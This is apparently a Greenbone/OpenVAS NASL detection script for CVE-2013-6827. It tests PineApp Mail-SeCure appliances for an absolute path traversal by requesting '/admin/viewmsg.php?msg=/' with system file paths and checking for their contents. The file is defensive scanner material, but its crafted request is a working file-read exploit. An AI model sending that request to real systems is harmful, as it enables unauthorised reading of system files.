if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802066" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 63827 );
	script_cve_id( "CVE-2013-6827" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-12-04 12:01:21 +0530 (Wed, 04 Dec 2013)" );
	script_name( "PineApp Mail-SeCure Absolute Path Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_exclude_keys( "Settings/disable_cgi_scanning", "PineApp/missing" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 7443 );
	script_tag( name: "summary", value: "This host is running PineApp Mail-SeCure appliance and is prone to absolute
  path traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send the crafted HTTP GET request and check is it possible to read
  the system file or not." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "insight", value: "The flaw is due to the '/admin/viewmsg.php' script not properly sanitizing
  user supplied input." );
	script_tag( name: "affected", value: "PineApp Mail-SeCure 5099SK version 3.70, Other versions may also be
  affected." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to perform directory
  traversal attacks and read arbitrary files on the affected appliance." );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2013/Nov/136" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/fulldisclosure/2013-11/0133.html" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 7443 );
res = http_get_cache( port: port, item: "/" );
if(!ContainsString( res, "PineApp" )){
	exit( 0 );
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = "/admin/viewmsg.php?msg=/" + file;
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(res && egrep( string: res, pattern: pattern )){
		report = http_report_vuln_url( url: url, port: port );
		security_message( data: report, port: port );
		exit( 0 );
	}
}
exit( 0 );

